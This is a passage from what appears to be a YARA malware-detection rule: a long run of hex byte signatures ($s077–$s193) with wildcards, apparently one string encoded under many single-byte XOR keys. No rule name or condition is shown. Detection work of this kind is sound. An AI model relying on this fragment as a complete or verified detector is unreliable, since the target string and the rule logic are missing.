		$s077 = { 4D 4C 4D 4C 4D 4F ?? ?? 4D 4F 4D 4C 4D 4F ?? ?? 4D 4E 4D 4F 4D 49 ?? ?? ?? ?? 4D 49 4D 4F 4D 49 ?? ?? ?? ?? 4D 48 4D 4C 4D 4F ?? ?? }
		$s078 = { 4E 4F 4E 4F 4E 4C ?? ?? 4E 4C 4E 4F 4E 4C ?? ?? 4E 4D 4E 4C 4E 4A ?? ?? ?? ?? 4E 4A 4E 4C 4E 4A ?? ?? ?? ?? 4E 4B 4E 4F 4E 4C ?? ?? }
		$s079 = { 4F 4E 4F 4E 4F 4D ?? ?? 4F 4D 4F 4E 4F 4D ?? ?? 4F 4C 4F 4D 4F 4B ?? ?? ?? ?? 4F 4B 4F 4D 4F 4B ?? ?? ?? ?? 4F 4A 4F 4E 4F 4D ?? ?? }
		$s080 = { 50 51 50 51 50 52 ?? ?? 50 52 50 51 50 52 ?? ?? 50 53 50 52 50 54 ?? ?? ?? ?? 50 54 50 52 50 54 ?? ?? ?? ?? 50 55 50 51 50 52 ?? ?? }
		$s081 = { 51 50 51 50 51 53 ?? ?? 51 53 51 50 51 53 ?? ?? 51 52 51 53 51 55 ?? ?? ?? ?? 51 55 51 53 51 55 ?? ?? ?? ?? 51 54 51 50 51 53 ?? ?? }
		$s082 = { 52 53 52 53 52 50 ?? ?? 52 50 52 53 52 50 ?? ?? 52 51 52 50 52 56 ?? ?? ?? ?? 52 56 52 50 52 56 ?? ?? ?? ?? 52 57 52 53 52 50 ?? ?? }
		$s083 = { 53 52 53 52 53 51 ?? ?? 53 51 53 52 53 51 ?? ?? 53 50 53 51 53 57 ?? ?? ?? ?? 53 57 53 51 53 57 ?? ?? ?? ?? 53 56 53 52 53 51 ?? ?? }
		$s084 = { 54 55 54 55 54 56 ?? ?? 54 56 54 55 54 56 ?? ?? 54 57 54 56 54 50 ?? ?? ?? ?? 54 50 54 56 54 50 ?? ?? ?? ?? 54 51 54 55 54 56 ?? ?? }
		$s085 = { 55 54 55 54 55 57 ?? ?? 55 57 55 54 55 57 ?? ?? 55 56 55 57 55 51 ?? ?? ?? ?? 55 51 55 57 55 51 ?? ?? ?? ?? 55 50 55 54 55 57 ?? ?? }
		$s086 = { 56 57 56 57 56 54 ?? ?? 56 54 56 57 56 54 ?? ?? 56 55 56 54 56 52 ?? ?? ?? ?? 56 52 56 54 56 52 ?? ?? ?? ?? 56 53 56 57 56 54 ?? ?? }
		$s087 = { 57 56 57 56 57 55 ?? ?? 57 55 57 56 57 55 ?? ?? 57 54 57 55 57 53 ?? ?? ?? ?? 57 53 57 55 57 53 ?? ?? ?? ?? 57 52 57 56 57 55 ?? ?? }
		$s088 = { 58 59 58 59 58 5A ?? ?? 58 5A 58 59 58 5A ?? ?? 58 5B 58 5A 58 5C ?? ?? ?? ?? 58 5C 58 5A 58 5C ?? ?? ?? ?? 58 5D 58 59 58 5A ?? ?? }
		$s089 = { 59 58 59 58 59 5B ?? ?? 59 5B 59 58 59 5B ?? ?? 59 5A 59 5B 59 5D ?? ?? ?? ?? 59 5D 59 5B 59 5D ?? ?? ?? ?? 59 5C 59 58 59 5B ?? ?? }
		$s090 = { 5A 5B 5A 5B 5A 58 ?? ?? 5A 58 5A 5B 5A 58 ?? ?? 5A 59 5A 58 5A 5E ?? ?? ?? ?? 5A 5E 5A 58 5A 5E ?? ?? ?? ?? 5A 5F 5A 5B 5A 58 ?? ?? }
		$s091 = { 5B 5A 5B 5A 5B 59 ?? ?? 5B 59 5B 5A 5B 59 ?? ?? 5B 58 5B 59 5B 5F ?? ?? ?? ?? 5B 5F 5B 59 5B 5F ?? ?? ?? ?? 5B 5E 5B 5A 5B 59 ?? ?? }
		$s092 = { 5C 5D 5C 5D 5C 5E ?? ?? 5C 5E 5C 5D 5C 5E ?? ?? 5C 5F 5C 5E 5C 58 ?? ?? ?? ?? 5C 58 5C 5E 5C 58 ?? ?? ?? ?? 5C 59 5C 5D 5C 5E ?? ?? }
		$s093 = { 5D 5C 5D 5C 5D 5F ?? ?? 5D 5F 5D 5C 5D 5F ?? ?? 5D 5E 5D 5F 5D 59 ?? ?? ?? ?? 5D 59 5D 5F 5D 59 ?? ?? ?? ?? 5D 58 5D 5C 5D 5F ?? ?? }
		$s094 = { 5E 5F 5E 5F 5E 5C ?? ?? 5E 5C 5E 5F 5E 5C ?? ?? 5E 5D 5E 5C 5E 5A ?? ?? ?? ?? 5E 5A 5E 5C 5E 5A ?? ?? ?? ?? 5E 5B 5E 5F 5E 5C ?? ?? }
		$s095 = { 5F 5E 5F 5E 5F 5D ?? ?? 5F 5D 5F 5E 5F 5D ?? ?? 5F 5C 5F 5D 5F 5B ?? ?? ?? ?? 5F 5B 5F 5D 5F 5B ?? ?? ?? ?? 5F 5A 5F 5E 5F 5D ?? ?? }
		$s096 = { 60 61 60 61 60 62 ?? ?? 60 62 60 61 60 62 ?? ?? 60 63 60 62 60 64 ?? ?? ?? ?? 60 64 60 62 60 64 ?? ?? ?? ?? 60 65 60 61 60 62 ?? ?? }
		$s097 = { 61 60 61 60 61 63 ?? ?? 61 63 61 60 61 63 ?? ?? 61 62 61 63 61 65 ?? ?? ?? ?? 61 65 61 63 61 65 ?? ?? ?? ?? 61 64 61 60 61 63 ?? ?? }
		$s098 = { 62 63 62 63 62 60 ?? ?? 62 60 62 63 62 60 ?? ?? 62 61 62 60 62 66 ?? ?? ?? ?? 62 66 62 60 62 66 ?? ?? ?? ?? 62 67 62 63 62 60 ?? ?? }
		$s099 = { 63 62 63 62 63 61 ?? ?? 63 61 63 62 63 61 ?? ?? 63 60 63 61 63 67 ?? ?? ?? ?? 63 67 63 61 63 67 ?? ?? ?? ?? 63 66 63 62 63 61 ?? ?? }
		$s100 = { 64 65 64 65 64 66 ?? ?? 64 66 64 65 64 66 ?? ?? 64 67 64 66 64 60 ?? ?? ?? ?? 64 60 64 66 64 60 ?? ?? ?? ?? 64 61 64 65 64 66 ?? ?? }
		$s101 = { 65 64 65 64 65 67 ?? ?? 65 67 65 64 65 67 ?? ?? 65 66 65 67 65 61 ?? ?? ?? ?? 65 61 65 67 65 61 ?? ?? ?? ?? 65 60 65 64 65 67 ?? ?? }
		$s102 = { 66 67 66 67 66 64 ?? ?? 66 64 66 67 66 64 ?? ?? 66 65 66 64 66 62 ?? ?? ?? ?? 66 62 66 64 66 62 ?? ?? ?? ?? 66 63 66 67 66 64 ?? ?? }
		$s103 = { 67 66 67 66 67 65 ?? ?? 67 65 67 66 67 65 ?? ?? 67 64 67 65 67 63 ?? ?? ?? ?? 67 63 67 65 67 63 ?? ?? ?? ?? 67 62 67 66 67 65 ?? ?? }
		$s104 = { 68 69 68 69 68 6A ?? ?? 68 6A 68 69 68 6A ?? ?? 68 6B 68 6A 68 6C ?? ?? ?? ?? 68 6C 68 6A 68 6C ?? ?? ?? ?? 68 6D 68 69 68 6A ?? ?? }
		$s105 = { 69 68 69 68 69 6B ?? ?? 69 6B 69 68 69 6B ?? ?? 69 6A 69 6B 69 6D ?? ?? ?? ?? 69 6D 69 6B 69 6D ?? ?? ?? ?? 69 6C 69 68 69 6B ?? ?? }
		$s106 = { 6A 6B 6A 6B 6A 68 ?? ?? 6A 68 6A 6B 6A 68 ?? ?? 6A 69 6A 68 6A 6E ?? ?? ?? ?? 6A 6E 6A 68 6A 6E ?? ?? ?? ?? 6A 6F 6A 6B 6A 68 ?? ?? }
		$s107 = { 6B 6A 6B 6A 6B 69 ?? ?? 6B 69 6B 6A 6B 69 ?? ?? 6B 68 6B 69 6B 6F ?? ?? ?? ?? 6B 6F 6B 69 6B 6F ?? ?? ?? ?? 6B 6E 6B 6A 6B 69 ?? ?? }
		$s108 = { 6C 6D 6C 6D 6C 6E ?? ?? 6C 6E 6C 6D 6C 6E ?? ?? 6C 6F 6C 6E 6C 68 ?? ?? ?? ?? 6C 68 6C 6E 6C 68 ?? ?? ?? ?? 6C 69 6C 6D 6C 6E ?? ?? }
		$s109 = { 6D 6C 6D 6C 6D 6F ?? ?? 6D 6F 6D 6C 6D 6F ?? ?? 6D 6E 6D 6F 6D 69 ?? ?? ?? ?? 6D 69 6D 6F 6D 69 ?? ?? ?? ?? 6D 68 6D 6C 6D 6F ?? ?? }
		$s110 = { 6E 6F 6E 6F 6E 6C ?? ?? 6E 6C 6E 6F 6E 6C ?? ?? 6E 6D 6E 6C 6E 6A ?? ?? ?? ?? 6E 6A 6E 6C 6E 6A ?? ?? ?? ?? 6E 6B 6E 6F 6E 6C ?? ?? }
		$s111 = { 6F 6E 6F 6E 6F 6D ?? ?? 6F 6D 6F 6E 6F 6D ?? ?? 6F 6C 6F 6D 6F 6B ?? ?? ?? ?? 6F 6B 6F 6D 6F 6B ?? ?? ?? ?? 6F 6A 6F 6E 6F 6D ?? ?? }
		$s112 = { 70 71 70 71 70 72 ?? ?? 70 72 70 71 70 72 ?? ?? 70 73 70 72 70 74 ?? ?? ?? ?? 70 74 70 72 70 74 ?? ?? ?? ?? 70 75 70 71 70 72 ?? ?? }
		$s113 = { 71 70 71 70 71 73 ?? ?? 71 73 71 70 71 73 ?? ?? 71 72 71 73 71 75 ?? ?? ?? ?? 71 75 71 73 71 75 ?? ?? ?? ?? 71 74 71 70 71 73 ?? ?? }
		$s114 = { 72 73 72 73 72 70 ?? ?? 72 70 72 73 72 70 ?? ?? 72 71 72 70 72 76 ?? ?? ?? ?? 72 76 72 70 72 76 ?? ?? ?? ?? 72 77 72 73 72 70 ?? ?? }
		$s115 = { 73 72 73 72 73 71 ?? ?? 73 71 73 72 73 71 ?? ?? 73 70 73 71 73 77 ?? ?? ?? ?? 73 77 73 71 73 77 ?? ?? ?? ?? 73 76 73 72 73 71 ?? ?? }
		$s116 = { 74 75 74 75 74 76 ?? ?? 74 76 74 75 74 76 ?? ?? 74 77 74 76 74 70 ?? ?? ?? ?? 74 70 74 76 74 70 ?? ?? ?? ?? 74 71 74 75 74 76 ?? ?? }
		$s117 = { 75 74 75 74 75 77 ?? ?? 75 77 75 74 75 77 ?? ?? 75 76 75 77 75 71 ?? ?? ?? ?? 75 71 75 77 75 71 ?? ?? ?? ?? 75 70 75 74 75 77 ?? ?? }
		$s118 = { 76 77 76 77 76 74 ?? ?? 76 74 76 77 76 74 ?? ?? 76 75 76 74 76 72 ?? ?? ?? ?? 76 72 76 74 76 72 ?? ?? ?? ?? 76 73 76 77 76 74 ?? ?? }
		$s119 = { 77 76 77 76 77 75 ?? ?? 77 75 77 76 77 75 ?? ?? 77 74 77 75 77 73 ?? ?? ?? ?? 77 73 77 75 77 73 ?? ?? ?? ?? 77 72 77 76 77 75 ?? ?? }
		$s120 = { 78 79 78 79 78 7A ?? ?? 78 7A 78 79 78 7A ?? ?? 78 7B 78 7A 78 7C ?? ?? ?? ?? 78 7C 78 7A 78 7C ?? ?? ?? ?? 78 7D 78 79 78 7A ?? ?? }
		$s121 = { 79 78 79 78 79 7B ?? ?? 79 7B 79 78 79 7B ?? ?? 79 7A 79 7B 79 7D ?? ?? ?? ?? 79 7D 79 7B 79 7D ?? ?? ?? ?? 79 7C 79 78 79 7B ?? ?? }
		$s122 = { 7A 7B 7A 7B 7A 78 ?? ?? 7A 78 7A 7B 7A 78 ?? ?? 7A 79 7A 78 7A 7E ?? ?? ?? ?? 7A 7E 7A 78 7A 7E ?? ?? ?? ?? 7A 7F 7A 7B 7A 78 ?? ?? }
		$s123 = { 7B 7A 7B 7A 7B 79 ?? ?? 7B 79 7B 7A 7B 79 ?? ?? 7B 78 7B 79 7B 7F ?? ?? ?? ?? 7B 7F 7B 79 7B 7F ?? ?? ?? ?? 7B 7E 7B 7A 7B 79 ?? ?? }
		$s124 = { 7C 7D 7C 7D 7C 7E ?? ?? 7C 7E 7C 7D 7C 7E ?? ?? 7C 7F 7C 7E 7C 78 ?? ?? ?? ?? 7C 78 7C 7E 7C 78 ?? ?? ?? ?? 7C 79 7C 7D 7C 7E ?? ?? }
		$s125 = { 7D 7C 7D 7C 7D 7F ?? ?? 7D 7F 7D 7C 7D 7F ?? ?? 7D 7E 7D 7F 7D 79 ?? ?? ?? ?? 7D 79 7D 7F 7D 79 ?? ?? ?? ?? 7D 78 7D 7C 7D 7F ?? ?? }
		$s126 = { 7E 7F 7E 7F 7E 7C ?? ?? 7E 7C 7E 7F 7E 7C ?? ?? 7E 7D 7E 7C 7E 7A ?? ?? ?? ?? 7E 7A 7E 7C 7E 7A ?? ?? ?? ?? 7E 7B 7E 7F 7E 7C ?? ?? }
		$s127 = { 7F 7E 7F 7E 7F 7D ?? ?? 7F 7D 7F 7E 7F 7D ?? ?? 7F 7C 7F 7D 7F 7B ?? ?? ?? ?? 7F 7B 7F 7D 7F 7B ?? ?? ?? ?? 7F 7A 7F 7E 7F 7D ?? ?? }
		$s128 = { 80 81 80 81 80 82 ?? ?? 80 82 80 81 80 82 ?? ?? 80 83 80 82 80 84 ?? ?? ?? ?? 80 84 80 82 80 84 ?? ?? ?? ?? 80 85 80 81 80 82 ?? ?? }
		$s129 = { 81 80 81 80 81 83 ?? ?? 81 83 81 80 81 83 ?? ?? 81 82 81 83 81 85 ?? ?? ?? ?? 81 85 81 83 81 85 ?? ?? ?? ?? 81 84 81 80 81 83 ?? ?? }
		$s130 = { 82 83 82 83 82 80 ?? ?? 82 80 82 83 82 80 ?? ?? 82 81 82 80 82 86 ?? ?? ?? ?? 82 86 82 80 82 86 ?? ?? ?? ?? 82 87 82 83 82 80 ?? ?? }
		$s131 = { 83 82 83 82 83 81 ?? ?? 83 81 83 82 83 81 ?? ?? 83 80 83 81 83 87 ?? ?? ?? ?? 83 87 83 81 83 87 ?? ?? ?? ?? 83 86 83 82 83 81 ?? ?? }
		$s132 = { 84 85 84 85 84 86 ?? ?? 84 86 84 85 84 86 ?? ?? 84 87 84 86 84 80 ?? ?? ?? ?? 84 80 84 86 84 80 ?? ?? ?? ?? 84 81 84 85 84 86 ?? ?? }
		$s133 = { 85 84 85 84 85 87 ?? ?? 85 87 85 84 85 87 ?? ?? 85 86 85 87 85 81 ?? ?? ?? ?? 85 81 85 87 85 81 ?? ?? ?? ?? 85 80 85 84 85 87 ?? ?? }
		$s134 = { 86 87 86 87 86 84 ?? ?? 86 84 86 87 86 84 ?? ?? 86 85 86 84 86 82 ?? ?? ?? ?? 86 82 86 84 86 82 ?? ?? ?? ?? 86 83 86 87 86 84 ?? ?? }
		$s135 = { 87 86 87 86 87 85 ?? ?? 87 85 87 86 87 85 ?? ?? 87 84 87 85 87 83 ?? ?? ?? ?? 87 83 87 85 87 83 ?? ?? ?? ?? 87 82 87 86 87 85 ?? ?? }
		$s136 = { 88 89 88 89 88 8A ?? ?? 88 8A 88 89 88 8A ?? ?? 88 8B 88 8A 88 8C ?? ?? ?? ?? 88 8C 88 8A 88 8C ?? ?? ?? ?? 88 8D 88 89 88 8A ?? ?? }
		$s137 = { 89 88 89 88 89 8B ?? ?? 89 8B 89 88 89 8B ?? ?? 89 8A 89 8B 89 8D ?? ?? ?? ?? 89 8D 89 8B 89 8D ?? ?? ?? ?? 89 8C 89 88 89 8B ?? ?? }
		$s138 = { 8A 8B 8A 8B 8A 88 ?? ?? 8A 88 8A 8B 8A 88 ?? ?? 8A 89 8A 88 8A 8E ?? ?? ?? ?? 8A 8E 8A 88 8A 8E ?? ?? ?? ?? 8A 8F 8A 8B 8A 88 ?? ?? }
		$s139 = { 8B 8A 8B 8A 8B 89 ?? ?? 8B 89 8B 8A 8B 89 ?? ?? 8B 88 8B 89 8B 8F ?? ?? ?? ?? 8B 8F 8B 89 8B 8F ?? ?? ?? ?? 8B 8E 8B 8A 8B 89 ?? ?? }
		$s140 = { 8C 8D 8C 8D 8C 8E ?? ?? 8C 8E 8C 8D 8C 8E ?? ?? 8C 8F 8C 8E 8C 88 ?? ?? ?? ?? 8C 88 8C 8E 8C 88 ?? ?? ?? ?? 8C 89 8C 8D 8C 8E ?? ?? }
		$s141 = { 8D 8C 8D 8C 8D 8F ?? ?? 8D 8F 8D 8C 8D 8F ?? ?? 8D 8E 8D 8F 8D 89 ?? ?? ?? ?? 8D 89 8D 8F 8D 89 ?? ?? ?? ?? 8D 88 8D 8C 8D 8F ?? ?? }
		$s142 = { 8E 8F 8E 8F 8E 8C ?? ?? 8E 8C 8E 8F 8E 8C ?? ?? 8E 8D 8E 8C 8E 8A ?? ?? ?? ?? 8E 8A 8E 8C 8E 8A ?? ?? ?? ?? 8E 8B 8E 8F 8E 8C ?? ?? }
		$s143 = { 8F 8E 8F 8E 8F 8D ?? ?? 8F 8D 8F 8E 8F 8D ?? ?? 8F 8C 8F 8D 8F 8B ?? ?? ?? ?? 8F 8B 8F 8D 8F 8B ?? ?? ?? ?? 8F 8A 8F 8E 8F 8D ?? ?? }
		$s144 = { 90 91 90 91 90 92 ?? ?? 90 92 90 91 90 92 ?? ?? 90 93 90 92 90 94 ?? ?? ?? ?? 90 94 90 92 90 94 ?? ?? ?? ?? 90 95 90 91 90 92 ?? ?? }
		$s145 = { 91 90 91 90 91 93 ?? ?? 91 93 91 90 91 93 ?? ?? 91 92 91 93 91 95 ?? ?? ?? ?? 91 95 91 93 91 95 ?? ?? ?? ?? 91 94 91 90 91 93 ?? ?? }
		$s146 = { 92 93 92 93 92 90 ?? ?? 92 90 92 93 92 90 ?? ?? 92 91 92 90 92 96 ?? ?? ?? ?? 92 96 92 90 92 96 ?? ?? ?? ?? 92 97 92 93 92 90 ?? ?? }
		$s147 = { 93 92 93 92 93 91 ?? ?? 93 91 93 92 93 91 ?? ?? 93 90 93 91 93 97 ?? ?? ?? ?? 93 97 93 91 93 97 ?? ?? ?? ?? 93 96 93 92 93 91 ?? ?? }
		$s148 = { 94 95 94 95 94 96 ?? ?? 94 96 94 95 94 96 ?? ?? 94 97 94 96 94 90 ?? ?? ?? ?? 94 90 94 96 94 90 ?? ?? ?? ?? 94 91 94 95 94 96 ?? ?? }
		$s149 = { 95 94 95 94 95 97 ?? ?? 95 97 95 94 95 97 ?? ?? 95 96 95 97 95 91 ?? ?? ?? ?? 95 91 95 97 95 91 ?? ?? ?? ?? 95 90 95 94 95 97 ?? ?? }
		$s150 = { 96 97 96 97 96 94 ?? ?? 96 94 96 97 96 94 ?? ?? 96 95 96 94 96 92 ?? ?? ?? ?? 96 92 96 94 96 92 ?? ?? ?? ?? 96 93 96 97 96 94 ?? ?? }
		$s151 = { 97 96 97 96 97 95 ?? ?? 97 95 97 96 97 95 ?? ?? 97 94 97 95 97 93 ?? ?? ?? ?? 97 93 97 95 97 93 ?? ?? ?? ?? 97 92 97 96 97 95 ?? ?? }
		$s152 = { 98 99 98 99 98 9A ?? ?? 98 9A 98 99 98 9A ?? ?? 98 9B 98 9A 98 9C ?? ?? ?? ?? 98 9C 98 9A 98 9C ?? ?? ?? ?? 98 9D 98 99 98 9A ?? ?? }
		$s153 = { 99 98 99 98 99 9B ?? ?? 99 9B 99 98 99 9B ?? ?? 99 9A 99 9B 99 9D ?? ?? ?? ?? 99 9D 99 9B 99 9D ?? ?? ?? ?? 99 9C 99 98 99 9B ?? ?? }
		$s154 = { 9A 9B 9A 9B 9A 98 ?? ?? 9A 98 9A 9B 9A 98 ?? ?? 9A 99 9A 98 9A 9E ?? ?? ?? ?? 9A 9E 9A 98 9A 9E ?? ?? ?? ?? 9A 9F 9A 9B 9A 98 ?? ?? }
		$s155 = { 9B 9A 9B 9A 9B 99 ?? ?? 9B 99 9B 9A 9B 99 ?? ?? 9B 98 9B 99 9B 9F ?? ?? ?? ?? 9B 9F 9B 99 9B 9F ?? ?? ?? ?? 9B 9E 9B 9A 9B 99 ?? ?? }
		$s156 = { 9C 9D 9C 9D 9C 9E ?? ?? 9C 9E 9C 9D 9C 9E ?? ?? 9C 9F 9C 9E 9C 98 ?? ?? ?? ?? 9C 98 9C 9E 9C 98 ?? ?? ?? ?? 9C 99 9C 9D 9C 9E ?? ?? }
		$s157 = { 9D 9C 9D 9C 9D 9F ?? ?? 9D 9F 9D 9C 9D 9F ?? ?? 9D 9E 9D 9F 9D 99 ?? ?? ?? ?? 9D 99 9D 9F 9D 99 ?? ?? ?? ?? 9D 98 9D 9C 9D 9F ?? ?? }
		$s158 = { 9E 9F 9E 9F 9E 9C ?? ?? 9E 9C 9E 9F 9E 9C ?? ?? 9E 9D 9E 9C 9E 9A ?? ?? ?? ?? 9E 9A 9E 9C 9E 9A ?? ?? ?? ?? 9E 9B 9E 9F 9E 9C ?? ?? }
		$s159 = { 9F 9E 9F 9E 9F 9D ?? ?? 9F 9D 9F 9E 9F 9D ?? ?? 9F 9C 9F 9D 9F 9B ?? ?? ?? ?? 9F 9B 9F 9D 9F 9B ?? ?? ?? ?? 9F 9A 9F 9E 9F 9D ?? ?? }
		$s160 = { A0 A1 A0 A1 A0 A2 ?? ?? A0 A2 A0 A1 A0 A2 ?? ?? A0 A3 A0 A2 A0 A4 ?? ?? ?? ?? A0 A4 A0 A2 A0 A4 ?? ?? ?? ?? A0 A5 A0 A1 A0 A2 ?? ?? }
		$s161 = { A1 A0 A1 A0 A1 A3 ?? ?? A1 A3 A1 A0 A1 A3 ?? ?? A1 A2 A1 A3 A1 A5 ?? ?? ?? ?? A1 A5 A1 A3 A1 A5 ?? ?? ?? ?? A1 A4 A1 A0 A1 A3 ?? ?? }
		$s162 = { A2 A3 A2 A3 A2 A0 ?? ?? A2 A0 A2 A3 A2 A0 ?? ?? A2 A1 A2 A0 A2 A6 ?? ?? ?? ?? A2 A6 A2 A0 A2 A6 ?? ?? ?? ?? A2 A7 A2 A3 A2 A0 ?? ?? }
		$s163 = { A3 A2 A3 A2 A3 A1 ?? ?? A3 A1 A3 A2 A3 A1 ?? ?? A3 A0 A3 A1 A3 A7 ?? ?? ?? ?? A3 A7 A3 A1 A3 A7 ?? ?? ?? ?? A3 A6 A3 A2 A3 A1 ?? ?? }
		$s164 = { A4 A5 A4 A5 A4 A6 ?? ?? A4 A6 A4 A5 A4 A6 ?? ?? A4 A7 A4 A6 A4 A0 ?? ?? ?? ?? A4 A0 A4 A6 A4 A0 ?? ?? ?? ?? A4 A1 A4 A5 A4 A6 ?? ?? }
		$s165 = { A5 A4 A5 A4 A5 A7 ?? ?? A5 A7 A5 A4 A5 A7 ?? ?? A5 A6 A5 A7 A5 A1 ?? ?? ?? ?? A5 A1 A5 A7 A5 A1 ?? ?? ?? ?? A5 A0 A5 A4 A5 A7 ?? ?? }
		$s166 = { A6 A7 A6 A7 A6 A4 ?? ?? A6 A4 A6 A7 A6 A4 ?? ?? A6 A5 A6 A4 A6 A2 ?? ?? ?? ?? A6 A2 A6 A4 A6 A2 ?? ?? ?? ?? A6 A3 A6 A7 A6 A4 ?? ?? }
		$s167 = { A7 A6 A7 A6 A7 A5 ?? ?? A7 A5 A7 A6 A7 A5 ?? ?? A7 A4 A7 A5 A7 A3 ?? ?? ?? ?? A7 A3 A7 A5 A7 A3 ?? ?? ?? ?? A7 A2 A7 A6 A7 A5 ?? ?? }
		$s168 = { A8 A9 A8 A9 A8 AA ?? ?? A8 AA A8 A9 A8 AA ?? ?? A8 AB A8 AA A8 AC ?? ?? ?? ?? A8 AC A8 AA A8 AC ?? ?? ?? ?? A8 AD A8 A9 A8 AA ?? ?? }
		$s169 = { A9 A8 A9 A8 A9 AB ?? ?? A9 AB A9 A8 A9 AB ?? ?? A9 AA A9 AB A9 AD ?? ?? ?? ?? A9 AD A9 AB A9 AD ?? ?? ?? ?? A9 AC A9 A8 A9 AB ?? ?? }
		$s170 = { AA AB AA AB AA A8 ?? ?? AA A8 AA AB AA A8 ?? ?? AA A9 AA A8 AA AE ?? ?? ?? ?? AA AE AA A8 AA AE ?? ?? ?? ?? AA AF AA AB AA A8 ?? ?? }
		$s171 = { AB AA AB AA AB A9 ?? ?? AB A9 AB AA AB A9 ?? ?? AB A8 AB A9 AB AF ?? ?? ?? ?? AB AF AB A9 AB AF ?? ?? ?? ?? AB AE AB AA AB A9 ?? ?? }
		$s172 = { AC AD AC AD AC AE ?? ?? AC AE AC AD AC AE ?? ?? AC AF AC AE AC A8 ?? ?? ?? ?? AC A8 AC AE AC A8 ?? ?? ?? ?? AC A9 AC AD AC AE ?? ?? }
		$s173 = { AD AC AD AC AD AF ?? ?? AD AF AD AC AD AF ?? ?? AD AE AD AF AD A9 ?? ?? ?? ?? AD A9 AD AF AD A9 ?? ?? ?? ?? AD A8 AD AC AD AF ?? ?? }
		$s174 = { AE AF AE AF AE AC ?? ?? AE AC AE AF AE AC ?? ?? AE AD AE AC AE AA ?? ?? ?? ?? AE AA AE AC AE AA ?? ?? ?? ?? AE AB AE AF AE AC ?? ?? }
		$s175 = { AF AE AF AE AF AD ?? ?? AF AD AF AE AF AD ?? ?? AF AC AF AD AF AB ?? ?? ?? ?? AF AB AF AD AF AB ?? ?? ?? ?? AF AA AF AE AF AD ?? ?? }
		$s176 = { B0 B1 B0 B1 B0 B2 ?? ?? B0 B2 B0 B1 B0 B2 ?? ?? B0 B3 B0 B2 B0 B4 ?? ?? ?? ?? B0 B4 B0 B2 B0 B4 ?? ?? ?? ?? B0 B5 B0 B1 B0 B2 ?? ?? }
		$s177 = { B1 B0 B1 B0 B1 B3 ?? ?? B1 B3 B1 B0 B1 B3 ?? ?? B1 B2 B1 B3 B1 B5 ?? ?? ?? ?? B1 B5 B1 B3 B1 B5 ?? ?? ?? ?? B1 B4 B1 B0 B1 B3 ?? ?? }
		$s178 = { B2 B3 B2 B3 B2 B0 ?? ?? B2 B0 B2 B3 B2 B0 ?? ?? B2 B1 B2 B0 B2 B6 ?? ?? ?? ?? B2 B6 B2 B0 B2 B6 ?? ?? ?? ?? B2 B7 B2 B3 B2 B0 ?? ?? }
		$s179 = { B3 B2 B3 B2 B3 B1 ?? ?? B3 B1 B3 B2 B3 B1 ?? ?? B3 B0 B3 B1 B3 B7 ?? ?? ?? ?? B3 B7 B3 B1 B3 B7 ?? ?? ?? ?? B3 B6 B3 B2 B3 B1 ?? ?? }
		$s180 = { B4 B5 B4 B5 B4 B6 ?? ?? B4 B6 B4 B5 B4 B6 ?? ?? B4 B7 B4 B6 B4 B0 ?? ?? ?? ?? B4 B0 B4 B6 B4 B0 ?? ?? ?? ?? B4 B1 B4 B5 B4 B6 ?? ?? }
		$s181 = { B5 B4 B5 B4 B5 B7 ?? ?? B5 B7 B5 B4 B5 B7 ?? ?? B5 B6 B5 B7 B5 B1 ?? ?? ?? ?? B5 B1 B5 B7 B5 B1 ?? ?? ?? ?? B5 B0 B5 B4 B5 B7 ?? ?? }
		$s182 = { B6 B7 B6 B7 B6 B4 ?? ?? B6 B4 B6 B7 B6 B4 ?? ?? B6 B5 B6 B4 B6 B2 ?? ?? ?? ?? B6 B2 B6 B4 B6 B2 ?? ?? ?? ?? B6 B3 B6 B7 B6 B4 ?? ?? }
		$s183 = { B7 B6 B7 B6 B7 B5 ?? ?? B7 B5 B7 B6 B7 B5 ?? ?? B7 B4 B7 B5 B7 B3 ?? ?? ?? ?? B7 B3 B7 B5 B7 B3 ?? ?? ?? ?? B7 B2 B7 B6 B7 B5 ?? ?? }
		$s184 = { B8 B9 B8 B9 B8 BA ?? ?? B8 BA B8 B9 B8 BA ?? ?? B8 BB B8 BA B8 BC ?? ?? ?? ?? B8 BC B8 BA B8 BC ?? ?? ?? ?? B8 BD B8 B9 B8 BA ?? ?? }
		$s185 = { B9 B8 B9 B8 B9 BB ?? ?? B9 BB B9 B8 B9 BB ?? ?? B9 BA B9 BB B9 BD ?? ?? ?? ?? B9 BD B9 BB B9 BD ?? ?? ?? ?? B9 BC B9 B8 B9 BB ?? ?? }
		$s186 = { BA BB BA BB BA B8 ?? ?? BA B8 BA BB BA B8 ?? ?? BA B9 BA B8 BA BE ?? ?? ?? ?? BA BE BA B8 BA BE ?? ?? ?? ?? BA BF BA BB BA B8 ?? ?? }
		$s187 = { BB BA BB BA BB B9 ?? ?? BB B9 BB BA BB B9 ?? ?? BB B8 BB B9 BB BF ?? ?? ?? ?? BB BF BB B9 BB BF ?? ?? ?? ?? BB BE BB BA BB B9 ?? ?? }
		$s188 = { BC BD BC BD BC BE ?? ?? BC BE BC BD BC BE ?? ?? BC BF BC BE BC B8 ?? ?? ?? ?? BC B8 BC BE BC B8 ?? ?? ?? ?? BC B9 BC BD BC BE ?? ?? }
		$s189 = { BD BC BD BC BD BF ?? ?? BD BF BD BC BD BF ?? ?? BD BE BD BF BD B9 ?? ?? ?? ?? BD B9 BD BF BD B9 ?? ?? ?? ?? BD B8 BD BC BD BF ?? ?? }
		$s190 = { BE BF BE BF BE BC ?? ?? BE BC BE BF BE BC ?? ?? BE BD BE BC BE BA ?? ?? ?? ?? BE BA BE BC BE BA ?? ?? ?? ?? BE BB BE BF BE BC ?? ?? }
		$s191 = { BF BE BF BE BF BD ?? ?? BF BD BF BE BF BD ?? ?? BF BC BF BD BF BB ?? ?? ?? ?? BF BB BF BD BF BB ?? ?? ?? ?? BF BA BF BE BF BD ?? ?? }
		$s192 = { C0 C1 C0 C1 C0 C2 ?? ?? C0 C2 C0 C1 C0 C2 ?? ?? C0 C3 C0 C2 C0 C4 ?? ?? ?? ?? C0 C4 C0 C2 C0 C4 ?? ?? ?? ?? C0 C5 C0 C1 C0 C2 ?? ?? }
		$s193 = { C1 C0 C1 C0 C1 C3 ?? ?? C1 C3 C1 C0 C1 C3 ?? ?? C1 C2 C1 C3 C1 C5 ?? ?? ?? ?? C1 C5 C1 C3 C1 C5 ?? ?? ?? ?? C1 C4 C1 C0 C1 C3 ?? ?? }
